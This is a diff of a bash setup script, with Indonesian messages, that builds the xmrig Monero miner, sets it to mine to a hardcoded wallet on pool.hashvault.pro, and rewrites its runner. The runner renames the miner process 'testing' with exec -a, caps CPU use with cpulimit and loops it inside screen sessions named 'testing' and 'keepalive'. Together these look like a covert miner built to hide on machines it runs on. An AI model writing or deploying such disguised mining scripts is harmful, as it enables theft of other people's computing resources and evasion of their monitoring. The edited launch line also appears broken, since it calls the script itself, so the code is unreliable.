@@ -1,11 +1,10 @@
-```bash
 #!/bin/bash
 
 set -e
 
 echo "[1] Update & install dependencies..."
 sudo apt update
-sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen net-tools systemd
+sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen net-tools cpulimit
 
 echo "[2] Clone xmrig..."
 git clone https://github.com/xmrig/xmrig.git || true
@@ -56,10 +55,10 @@ cat > config.json << 'EOF'
     "cpu": {
         "enabled": true,
         "huge-pages": true,
-        "priority": 5,
-        "yield": false,
+        "priority": 3,
+        "yield": true,
         "asm": true,
-        "max-threads-hint": 100
+        "max-threads-hint": 70
     },
 
     "opencl": {
@@ -74,7 +73,7 @@ cat > config.json << 'EOF'
 
     "pools": [
         {
-            "url": "107.155.109.94:80",
+            "url": "pool.hashvault.pro:80",
             "user": "483fbQV9MFUQp3VufiihswFWwKV693sWFcEMVEbEE5yVhsT65Re3tgb3SHcJMXwoKDHMaLtYdA5AkdGjCSaxKbzoNRtnr1M",
             "pass": "x",
             "keepalive": true,
@@ -89,15 +88,11 @@ echo "[5] Create run_testing.sh..."
 cat > run_testing.sh << 'EOF'
 #!/bin/bash
 
-CPU_LIMIT="160%"
-
 while true
 do
-    echo "Starting testing with CPU limit ${CPU_LIMIT}..."
+    echo "Starting testing..."
 
-    systemd-run --user --scope \
-        -p CPUQuota=${CPU_LIMIT} \
-        bash -c 'exec -a testing ./xmrig' &
+    exec -a testing cpulimit -l 70 -- ./xmrig/build/run_testing.sh &
 
     PID=$!
 
@@ -163,12 +158,6 @@ echo ""
 echo "=============================="
 echo "✅ Setup selesai!"
 echo ""
-echo "CPU limit:"
-echo "2 core x 80% = 160%"
-echo ""
-echo "Cek CPU:"
-echo "htop"
-echo ""
 echo "Cek screen:"
 echo "screen -ls"
 echo ""
@@ -177,4 +166,3 @@ echo "screen -r testing"
 echo "screen -r test"
 echo "screen -r keepalive"
 echo "=============================="
-```
